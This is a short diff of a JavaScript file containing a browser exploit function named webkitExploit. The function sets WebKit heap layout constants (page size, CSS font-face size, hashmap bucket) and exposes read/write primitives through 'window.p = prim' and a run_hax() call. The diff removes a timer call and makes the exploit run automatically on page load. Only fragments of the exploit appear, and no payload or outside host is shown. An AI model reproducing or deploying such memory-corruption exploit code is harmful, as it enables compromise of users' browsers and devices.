@@ -679,7 +679,6 @@ function run_hax() {
     }
 }
 function webkitExploit() {
-StartTimer();
 var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
@@ -1086,7 +1085,8 @@ obj_slave.obj = obj;
 return new int64(obj_master[4], obj_master[5]);
 }
 };
-}
-
 window.p = prim;
 run_hax();
+}
+
+webkitExploit();
